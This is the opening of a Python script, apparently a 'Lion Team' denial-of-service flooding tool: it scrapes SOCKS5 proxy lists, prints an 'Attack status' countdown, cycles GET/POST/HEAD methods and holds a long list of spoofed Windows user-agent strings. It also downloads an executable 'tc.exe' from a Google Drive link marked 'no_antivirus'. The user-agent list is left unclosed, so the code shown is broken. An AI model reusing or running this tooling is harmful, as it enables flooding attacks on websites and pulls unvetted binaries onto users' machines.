# -*- coding: utf-8 -*-
#!/usr/bin/env python3
"""
 COPYRIGHT Lion Team Edit + API
"""

def warn(*args, **kwargs):
    pass
import wget
from itertools import count
import shutil
import requests as r, os, threading, random
import shutup; shutup.please() # pip3 install shutup
import warnings; warnings.filterwarnings("ignore"); warnings.simplefilter("ignore"); warnings.warn = warn
from threading import Thread
import cmd
from pystyle import Colors, Colorate, Center
import colorama
import requests
import random
import string
import sys
import pcpy
import time
import os
import urllib.request
import re
from os import system, name, mkdir,rmdir
import httpx
import undetected_chromedriver as webdriver
from httpx import AsyncClient, Headers
import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random, socket, sys
with warnings.catch_warnings():
    warnings.filterwarnings("ignore",category=DeprecationWarning)
    import socket
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init,Style,Back
from flask import request
from flask import jsonify

def checkExtraMethod():
    # Проверка TCP
    try:
        ctcp = open('tc.exe')
    except:
        print(Fore.MAGENTA + 'Downloading extra method..')
        wget.download('https://drive.google.com/uc?export=download&confirm=no_antivirus&id=1NLUkyA5M-rKQnm6rBQrnwbZreonzFf8D')
        print(Fore.MAGENTA + 'Downloaded!')

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r " + Fore.MAGENTA + "[*]" + Fore.WHITE + " Attack status => " + str(
                (until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write(
                "\r " + Fore.MAGENTA + "[*]" + Fore.WHITE + " Attack Done !                                   \n")
            return

method = [
    "GET",
    "POST",
    "HEAD",
]

proxyResources = [
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
    'https://www.proxyscan.io/download?type=socks5',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
]
socksFile= "socks5.txt"
#GET SOCKS
def socksCrawler():
    global socksFile, socksResources
    f = open(socksFile,'wb')
    for url in proxyResources:
        try:
            f.write(requests.get(url).content)
        except:
            pass
    f.close()

useragents=["windows|Mozilla/5.0 (Windows; Windows NT 10.1; x64; en-US) AppleWebKit/602.6 (KHTML, like Gecko) Chrome/54.0.1165.132 Safari/533
windows|Mozilla/5.0 (Windows; U; Windows NT 10.3; WOW64) AppleWebKit/534.46 (KHTML, like Gecko) Chrome/54.0.2783.262 Safari/602.3 Edge/10.19098
windows|Mozilla/5.0 (Windows; Windows NT 6.1; Win64; x64; en-US) AppleWebKit/603.31 (KHTML, like Gecko) Chrome/48.0.1535.343 Safari/533
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0;) AppleWebKit/601.49 (KHTML, like Gecko) Chrome/52.0.2594.310 Safari/603.7 Edge/13.20442
windows|Mozilla/5.0 (Windows NT 10.4; WOW64; en-US) Gecko/20130401 Firefox/63.3
windows|Mozilla/5.0 (Windows; Windows NT 6.2; WOW64) AppleWebKit/533.16 (KHTML, like Gecko) Chrome/47.0.1921.366 Safari/534
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; WOW64; en-US) AppleWebKit/536.1 (KHTML, like Gecko) Chrome/47.0.2995.146 Safari/600.0 Edge/11.41239
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4; x64; en-US) AppleWebKit/603.40 (KHTML, like Gecko) Chrome/49.0.1198.107 Safari/600
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 10.3; x64 Trident/5.0)
windows|Mozilla/5.0 (Windows; Windows NT 6.0; x64; en-US) Gecko/20100101 Firefox/54.6
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0;; en-US) Gecko/20130401 Firefox/61.2
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2;; en-US Trident/4.0)
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.4; WOW64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows NT 10.1;; en-US) AppleWebKit/602.40 (KHTML, like Gecko) Chrome/53.0.2343.367 Safari/535.6 Edge/17.43632
windows|Mozilla/5.0 (Windows NT 6.3; WOW64) Gecko/20100101 Firefox/67.8
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64; en-US) AppleWebKit/533.18 (KHTML, like Gecko) Chrome/47.0.3564.343 Safari/602
windows|Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/52.0.2343.196 Safari/601
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 10.4; Win64; x64; en-US Trident/5.0)
windows|Mozilla/5.0 (Windows; Windows NT 6.0;; en-US) AppleWebKit/533.30 (KHTML, like Gecko) Chrome/54.0.2221.375 Safari/603
windows|Mozilla/5.0 (Windows; U; Windows NT 10.0; x64; en-US) AppleWebKit/603.28 (KHTML, like Gecko) Chrome/48.0.3848.179 Safari/600
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; Windows NT 10.3; Trident/4.0)
windows|Mozilla/5.0 (Windows NT 10.5; WOW64; en-US) Gecko/20100101 Firefox/46.0
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1; x64; en-US) AppleWebKit/603.4 (KHTML, like Gecko) Chrome/52.0.2889.358 Safari/600.0 Edge/10.77855
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 10.0; Trident/6.0)
windows|Mozilla/5.0 (Windows NT 10.2;; en-US) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/51.0.3741.378 Safari/601.4 Edge/12.12423
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0; Win64; x64) AppleWebKit/535.47 (KHTML, like Gecko) Chrome/53.0.3848.368 Safari/534
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; Win64; x64; en-US) Gecko/20130401 Firefox/51.8
windows|Mozilla/5.0 (Windows NT 10.2; Win64; x64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/55.0.2003.370 Safari/535.2 Edge/16.90841
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2; Win64; x64) AppleWebKit/535.33 (KHTML, like Gecko) Chrome/53.0.1076.263 Safari/536.3 Edge/13.43507
windows|Mozilla/5.0 (Windows; U; Windows NT 10.3; x64; en-US) AppleWebKit/537.25 (KHTML, like Gecko) Chrome/54.0.1514.232 Safari/601
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 10.5; x64; en-US Trident/6.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1;; en-US) Gecko/20100101 Firefox/51.5
windows|Mozilla/5.0 (Windows NT 10.4;) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/54.0.1587.167 Safari/533
windows|Mozilla/5.0 (Windows; Windows NT 10.3; Win64; x64) AppleWebKit/533.30 (KHTML, like Gecko) Chrome/52.0.3383.168 Safari/602.8 Edge/11.72027
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 10.0; x64 Trident/7.0)
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.2;; en-US Trident/5.0)
windows|Mozilla/5.0 (Windows NT 6.3; x64) Gecko/20100101 Firefox/72.5
windows|Mozilla/5.0 (Windows; Windows NT 6.1; Win64; x64) Gecko/20100101 Firefox/49.8
windows|Mozilla/5.0 (Windows; Windows NT 10.0;) AppleWebKit/600.13 (KHTML, like Gecko) Chrome/47.0.2263.373 Safari/533
windows|Mozilla/5.0 (Windows NT 6.0;) Gecko/20100101 Firefox/71.7
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; Windows NT 6.3; WOW64 Trident/6.0)
windows|Mozilla/5.0 (Windows NT 6.3; WOW64; en-US) AppleWebKit/603.20 (KHTML, like Gecko) Chrome/49.0.1760.121 Safari/536
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 6.0; Trident/4.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 10.0; WOW64; en-US) Gecko/20100101 Firefox/48.7
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; Win64; x64) AppleWebKit/534.50 (KHTML, like Gecko) Chrome/48.0.3464.314 Safari/603
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64) Gecko/20100101 Firefox/46.6
windows|Mozilla/5.0 (Windows; U; Windows NT 6.3;) Gecko/20100101 Firefox/45.8
windows|Mozilla/5.0 (Windows NT 10.5; WOW64; en-US) AppleWebKit/603.9 (KHTML, like Gecko) Chrome/50.0.3128.171 Safari/533.9 Edge/14.15292
windows|Mozilla/5.0 (Windows NT 6.1;) Gecko/20100101 Firefox/61.6
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 6.0; x64; en-US Trident/6.0)
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.2; Trident/7.0)
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; en-US Trident/6.0)
windows|Mozilla/5.0 (Windows NT 10.5; x64) AppleWebKit/602.7 (KHTML, like Gecko) Chrome/53.0.2705.295 Safari/603
windows|Mozilla/5.0 (Windows; Windows NT 10.1; WOW64) AppleWebKit/536.42 (KHTML, like Gecko) Chrome/50.0.1055.364 Safari/600.8 Edge/8.40880
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2; x64; en-US) AppleWebKit/602.4 (KHTML, like Gecko) Chrome/55.0.2663.371 Safari/603.8 Edge/17.38406
windows|Mozilla/5.0 (Windows; Windows NT 10.0; WOW64) Gecko/20100101 Firefox/67.2
windows|Mozilla/5.0 (Windows NT 6.3;) AppleWebKit/600.9 (KHTML, like Gecko) Chrome/51.0.3860.134 Safari/602.1 Edge/13.20155
windows|Mozilla/5.0 (Windows; Windows NT 6.2; x64; en-US) Gecko/20100101 Firefox/66.0
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; Win64; x64; en-US) AppleWebKit/602.36 (KHTML, like Gecko) Chrome/48.0.3652.347 Safari/601.7 Edge/9.36184
windows|Mozilla/5.0 (Windows; Windows NT 6.0; WOW64) Gecko/20130401 Firefox/65.1
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; Windows NT 6.2; x64; en-US Trident/4.0)
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; U; Windows NT 10.1; x64; en-US Trident/5.0)
windows|Mozilla/5.0 (Windows NT 10.4; WOW64) Gecko/20100101 Firefox/72.5
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 6.1; Trident/6.0)
windows|Mozilla/5.0 (Windows NT 6.1;) AppleWebKit/600.6 (KHTML, like Gecko) Chrome/50.0.3349.180 Safari/533
windows|Mozilla/5.0 (Windows; U; Windows NT 10.5; Win64; x64; en-US) AppleWebKit/603.6 (KHTML, like Gecko) Chrome/49.0.3930.342 Safari/602
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; WOW64) AppleWebKit/533.16 (KHTML, like Gecko) Chrome/55.0.3423.378 Safari/603
windows|Mozilla/5.0 (Windows; Windows NT 10.2; WOW64; en-US) Gecko/20100101 Firefox/55.0
windows|Mozilla/5.0 (Windows NT 10.0; WOW64; en-US) Gecko/20100101 Firefox/55.8
windows|Mozilla/5.0 (Windows NT 10.5; Win64; x64; en-US) Gecko/20100101 Firefox/51.5
windows|Mozilla/5.0 (Windows; U; Windows NT 10.0; WOW64; en-US) AppleWebKit/536.34 (KHTML, like Gecko) Chrome/48.0.1610.194 Safari/534
windows|Mozilla/5.0 (Windows; Windows NT 10.1; Win64; x64) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/55.0.3195.388 Safari/536
windows|Mozilla/5.0 (Windows; Windows NT 10.0; WOW64) Gecko/20100101 Firefox/47.1
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0; WOW64; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/53.0.2134.340 Safari/537
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; Win64; x64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/48.0.3961.125 Safari/602.0 Edge/8.93452
windows|Mozilla/5.0 (Windows NT 10.2; x64; en-US) Gecko/20100101 Firefox/74.4
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; en-US Trident/6.0)
windows|Mozilla/5.0 (Windows; Windows NT 10.2; WOW64; en-US) AppleWebKit/602.43 (KHTML, like Gecko) Chrome/49.0.2842.307 Safari/600
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.1; x64 Trident/7.0)
windows|Mozilla/5.0 (Windows NT 10.3;; en-US) AppleWebKit/535.12 (KHTML, like Gecko) Chrome/48.0.1229.222 Safari/600
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 10.2; WOW64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows; Windows NT 10.1;; en-US) Gecko/20130401 Firefox/52.5
windows|Mozilla/5.0 (Windows; U; Windows NT 10.0; WOW64; en-US) Gecko/20100101 Firefox/60.9
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64 Trident/6.0)
windows|Mozilla/5.0 (Windows; Windows NT 10.3; WOW64; en-US) AppleWebKit/534.5 (KHTML, like Gecko) Chrome/53.0.2994.317 Safari/601
windows|Mozilla/5.0 (Windows NT 10.4; WOW64; en-US) AppleWebKit/602.39 (KHTML, like Gecko) Chrome/52.0.1858.351 Safari/603
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 10.2; Win64; x64 Trident/7.0)
windows|Mozilla/5.0 (Windows NT 6.1; x64; en-US) Gecko/20100101 Firefox/65.3
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4; Win64; x64) AppleWebKit/602.35 (KHTML, like Gecko) Chrome/48.0.3558.335 Safari/536.6 Edge/8.29208
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2; WOW64) AppleWebKit/536.21 (KHTML, like Gecko) Chrome/54.0.1767.299 Safari/602.6 Edge/8.14619
windows|Mozilla/5.0 (Windows NT 6.1; Win64; x64; en-US) AppleWebKit/602.16 (KHTML, like Gecko) Chrome/51.0.3033.148 Safari/537.0 Edge/13.74187
windows|Mozilla/5.0 (Windows; Windows NT 6.2; WOW64) AppleWebKit/602.38 (KHTML, like Gecko) Chrome/51.0.3647.127 Safari/533
windows|Mozilla/5.0 (Windows NT 10.5; Win64; x64) AppleWebKit/537.48 (KHTML, like Gecko) Chrome/53.0.2027.378 Safari/600
windows|Mozilla/5.0 (Windows; U; Windows NT 10.0;) Gecko/20100101 Firefox/45.1
windows|Mozilla/5.0 (Windows NT 6.1; Win64; x64; en-US) Gecko/20100101 Firefox/48.1
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 10.3; WOW64 Trident/4.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; x64; en-US) AppleWebKit/536.36 (KHTML, like Gecko) Chrome/50.0.1430.129 Safari/536.5 Edge/16.92948
windows|Mozilla/5.0 (Windows NT 6.3;; en-US) AppleWebKit/537.50 (KHTML, like Gecko) Chrome/54.0.3683.124 Safari/534
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 10.5; Win64; x64; en-US Trident/5.0)
windows|Mozilla/5.0 (Windows; Windows NT 6.0;) Gecko/20100101 Firefox/63.1
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.2; x64 Trident/6.0)
windows|Mozilla/5.0 (Windows; Windows NT 10.0; x64) Gecko/20130401 Firefox/65.7
windows|Mozilla/5.0 (Windows NT 10.5;) Gecko/20130401 Firefox/55.3
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.1; WOW64 Trident/7.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.3; WOW64; en-US) AppleWebKit/602.8 (KHTML, like Gecko) Chrome/52.0.2961.372 Safari/600.6 Edge/12.17901
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0;) Gecko/20100101 Firefox/50.3
windows|Mozilla/5.0 (Windows NT 6.1; x64; en-US) AppleWebKit/603.47 (KHTML, like Gecko) Chrome/55.0.1880.363 Safari/535
windows|Mozilla/5.0 (Windows; Windows NT 10.5;; en-US) AppleWebKit/533.24 (KHTML, like Gecko) Chrome/55.0.3529.258 Safari/603
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2;; en-US) AppleWebKit/536.18 (KHTML, like Gecko) Chrome/47.0.1667.234 Safari/603.8 Edge/14.75493
windows|Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/603.17 (KHTML, like Gecko) Chrome/50.0.2862.286 Safari/600.6 Edge/17.32498
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2;) Gecko/20130401 Firefox/71.3
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64) AppleWebKit/536.32 (KHTML, like Gecko) Chrome/50.0.1762.224 Safari/601
windows|Mozilla/5.0 (Windows; Windows NT 6.1; WOW64; en-US) AppleWebKit/603.19 (KHTML, like Gecko) Chrome/50.0.3618.386 Safari/603
windows|Mozilla/5.0 (Windows NT 10.1; WOW64; en-US) Gecko/20130401 Firefox/53.0
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 6.1; Trident/5.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 10.3; WOW64; en-US) AppleWebKit/603.36 (KHTML, like Gecko) Chrome/50.0.3895.217 Safari/535.6 Edge/10.22779
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64 Trident/4.0)
windows|Mozilla/5.0 (Windows NT 10.3; WOW64; en-US) AppleWebKit/603.2 (KHTML, like Gecko) Chrome/50.0.1200.135 Safari/602.2 Edge/10.24094
windows|Mozilla/5.0 (Windows NT 10.2; WOW64; en-US) AppleWebKit/603.43 (KHTML, like Gecko) Chrome/49.0.3276.271 Safari/601
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.1;; en-US Trident/7.0)
windows|Mozilla/5.0 (Windows NT 10.0; x64) AppleWebKit/601.38 (KHTML, like Gecko) Chrome/48.0.1900.296 Safari/600.7 Edge/12.32720
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0; Win64; x64; en-US) Gecko/20100101 Firefox/46.7
windows|Mozilla/5.0 (Windows; U; Windows NT 10.0; x64) Gecko/20100101 Firefox/65.3
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; Win64; x64; en-US) Gecko/20130401 Firefox/72.6
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; Win64; x64) AppleWebKit/602.48 (KHTML, like Gecko) Chrome/53.0.2684.116 Safari/537.7 Edge/12.34556
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2; WOW64) AppleWebKit/536.8 (KHTML, like Gecko) Chrome/53.0.3408.144 Safari/603.6 Edge/18.40123
windows|Mozilla/5.0 (Windows NT 10.2;) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/51.0.2065.327 Safari/533
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4;) AppleWebKit/533.41 (KHTML, like Gecko) Chrome/48.0.3462.291 Safari/601
windows|Mozilla/5.0 (Windows; Windows NT 6.2; WOW64) AppleWebKit/600.21 (KHTML, like Gecko) Chrome/50.0.3203.391 Safari/536
windows|Mozilla/5.0 (Windows; U; Windows NT 6.3; WOW64) AppleWebKit/601.11 (KHTML, like Gecko) Chrome/49.0.1977.145 Safari/603
windows|Mozilla/5.0 (Windows NT 6.3; WOW64; en-US) AppleWebKit/535.16 (KHTML, like Gecko) Chrome/55.0.1315.395 Safari/603.6 Edge/14.18528
windows|Mozilla/5.0 (Windows; U; Windows NT 10.5; x64) AppleWebKit/601.10 (KHTML, like Gecko) Chrome/52.0.2327.209 Safari/600.8 Edge/11.81556
windows|Mozilla/5.0 (Windows; Windows NT 10.4;) AppleWebKit/534.40 (KHTML, like Gecko) Chrome/52.0.2533.282 Safari/535.4 Edge/16.66881
windows|Mozilla/5.0 (Windows; Windows NT 10.1; WOW64; en-US) Gecko/20100101 Firefox/52.5
windows|Mozilla/5.0 (Windows; Windows NT 6.3; Win64; x64) Gecko/20130401 Firefox/58.1
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 6.2; WOW64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows; Windows NT 6.3; Win64; x64; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/52.0.2860.124 Safari/536
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 10.0; Win64; x64 Trident/4.0)
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 10.2; Win64; x64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/55.0.1127.147 Safari/536
windows|Mozilla/5.0 (Windows; U; Windows NT 10.3;) AppleWebKit/535.45 (KHTML, like Gecko) Chrome/54.0.2177.387 Safari/600
windows|Mozilla/5.0 (Windows; Windows NT 6.3; WOW64) AppleWebKit/601.49 (KHTML, like Gecko) Chrome/49.0.2810.179 Safari/537.3 Edge/13.34279
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 6.1; x64 Trident/6.0)
windows|Mozilla/5.0 (Windows NT 10.1; x64) AppleWebKit/533.16 (KHTML, like Gecko) Chrome/49.0.3387.302 Safari/533.5 Edge/17.85134
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; WOW64; en-US) AppleWebKit/600.39 (KHTML, like Gecko) Chrome/48.0.1870.112 Safari/533.6 Edge/9.64337
windows|Mozilla/5.0 (Windows; U; Windows NT 10.3;) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/53.0.2814.222 Safari/536.4 Edge/13.30405
windows|Mozilla/5.0 (Windows; Windows NT 10.1; WOW64; en-US) Gecko/20100101 Firefox/73.6
windows|Mozilla/5.0 (Windows NT 6.1; x64) AppleWebKit/602.39 (KHTML, like Gecko) Chrome/53.0.1284.223 Safari/602
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; Win64; x64) AppleWebKit/602.45 (KHTML, like Gecko) Chrome/47.0.2276.168 Safari/603.2 Edge/14.88614
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Win64; x64 Trident/6.0)
windows|Mozilla/5.0 (Windows NT 10.2;) Gecko/20100101 Firefox/49.9
windows|Mozilla/5.0 (Windows NT 6.0; x64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/54.0.2459.281 Safari/537.0 Edge/9.40601
windows|Mozilla/5.0 (Windows; Windows NT 10.2; Win64; x64; en-US) Gecko/20100101 Firefox/56.6
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 6.1; WOW64 Trident/6.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2; WOW64) AppleWebKit/536.42 (KHTML, like Gecko) Chrome/48.0.3127.154 Safari/535.1 Edge/17.82552
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1; Win64; x64; en-US) AppleWebKit/603.28 (KHTML, like Gecko) Chrome/48.0.3576.113 Safari/534
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; U; Windows NT 10.3; WOW64 Trident/5.0)
windows|Mozilla/5.0 (Windows NT 10.0;; en-US) Gecko/20100101 Firefox/52.3
windows|Mozilla/5.0 (Windows; Windows NT 10.2; WOW64) Gecko/20100101 Firefox/47.4
windows|Mozilla/5.0 (Windows; Windows NT 6.0; Win64; x64) AppleWebKit/602.46 (KHTML, like Gecko) Chrome/51.0.3353.334 Safari/536.3 Edge/18.91670
windows|Mozilla/5.0 (Windows; Windows NT 6.1; x64) Gecko/20100101 Firefox/59.2
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0;) AppleWebKit/533.48 (KHTML, like Gecko) Chrome/54.0.1154.138 Safari/535
windows|Mozilla/5.0 (Windows; Windows NT 6.1; x64; en-US) Gecko/20100101 Firefox/52.0
windows|Mozilla/5.0 (Windows; Windows NT 6.1; Win64; x64) AppleWebKit/601.2 (KHTML, like Gecko) Chrome/49.0.1042.226 Safari/601
windows|Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/52.0.2748.341 Safari/533.8 Edge/14.76392
windows|Mozilla/5.0 (Windows NT 6.1;) AppleWebKit/603.34 (KHTML, like Gecko) Chrome/50.0.2202.228 Safari/536.5 Edge/9.43835
windows|Mozilla/5.0 (Windows; Windows NT 6.3; Win64; x64; en-US) AppleWebKit/601.33 (KHTML, like Gecko) Chrome/51.0.3393.194 Safari/602
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; Win64; x64 Trident/5.0)
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 10.2;; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows NT 6.2; Win64; x64; en-US) Gecko/20130401 Firefox/66.8
windows|Mozilla/5.0 (Windows NT 6.2; Win64; x64; en-US) Gecko/20130401 Firefox/48.4
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; Windows NT 10.4; Win64; x64 Trident/6.0)
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.3;; en-US Trident/4.0)
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 10.0;; en-US Trident/4.0)
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows; Windows NT 10.3; Win64; x64; en-US) Gecko/20100101 Firefox/61.3
windows|Mozilla/5.0 (Windows NT 6.3; Win64; x64; en-US) AppleWebKit/600.12 (KHTML, like Gecko) Chrome/50.0.3179.298 Safari/603.8 Edge/9.64901
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.1; x64; en-US Trident/7.0)
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 10.1; WOW64 Trident/5.0)
windows|Mozilla/5.0 (Windows NT 10.4; Win64; x64) AppleWebKit/536.25 (KHTML, like Gecko) Chrome/48.0.3485.190 Safari/600.9 Edge/16.64472
windows|Mozilla/5.0 (Windows NT 10.3;) Gecko/20100101 Firefox/62.0
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.3; Win64; x64; en-US Trident/7.0)
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 10.1;; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows; Windows NT 6.2; Win64; x64; en-US) Gecko/20130401 Firefox/61.9
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 10.2; x64 Trident/4.0)
windows|Mozilla/5.0 (Windows; Windows NT 10.4; Win64; x64) AppleWebKit/534.39 (KHTML, like Gecko) Chrome/53.0.3570.252 Safari/602.1 Edge/16.65192
windows|Mozilla/5.0 (Windows; Windows NT 6.3; WOW64; en-US) AppleWebKit/602.3 (KHTML, like Gecko) Chrome/55.0.3756.242 Safari/601
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1;) AppleWebKit/536.44 (KHTML, like Gecko) Chrome/55.0.2870.184 Safari/533.6 Edge/17.78087
windows|Mozilla/5.0 (Windows; Windows NT 10.5; Win64; x64; en-US) AppleWebKit/534.31 (KHTML, like Gecko) Chrome/55.0.1194.165 Safari/533
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; WOW64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; x64; en-US) AppleWebKit/534.19 (KHTML, like Gecko) Chrome/52.0.2406.219 Safari/533.0 Edge/16.82014
windows|Mozilla/5.0 (Windows; Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/66.3
windows|Mozilla/5.0 (Windows; U; Windows NT 6.1; Win64; x64; en-US) Gecko/20100101 Firefox/74.7
windows|Mozilla/5.0 (Windows; Windows NT 10.5;) AppleWebKit/603.36 (KHTML, like Gecko) Chrome/50.0.2949.288 Safari/534.0 Edge/14.65085
windows|Mozilla/5.0 (Windows; U; Windows NT 10.3; Win64; x64) Gecko/20100101 Firefox/55.7
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.1; x64 Trident/7.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1; Win64; x64) AppleWebKit/601.1 (KHTML, like Gecko) Chrome/48.0.1614.225 Safari/535.4 Edge/9.53311
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 10.0; WOW64; en-US Trident/7.0)
windows|Mozilla/5.0 (Windows NT 6.1; Win64; x64; en-US) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/47.0.3092.284 Safari/602
windows|Mozilla/5.0 (Windows NT 6.2; x64; en-US) AppleWebKit/603.44 (KHTML, like Gecko) Chrome/47.0.1879.205 Safari/601.4 Edge/13.49907
windows|Mozilla/5.0 (Windows NT 6.0;) AppleWebKit/537.7 (KHTML, like Gecko) Chrome/52.0.1857.147 Safari/600.3 Edge/9.29996
windows|Mozilla/5.0 (Windows; U; Windows NT 10.5; Win64; x64) AppleWebKit/600.50 (KHTML, like Gecko) Chrome/54.0.3009.219 Safari/600
windows|Mozilla/5.0 (Windows; Windows NT 10.4;; en-US) Gecko/20100101 Firefox/71.9
windows|Mozilla/5.0 (Windows NT 10.4; WOW64; en-US) Gecko/20100101 Firefox/50.3
windows|Mozilla/5.0 (Windows; Windows NT 6.2; Win64; x64) Gecko/20100101 Firefox/60.1
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;; en-US Trident/5.0)
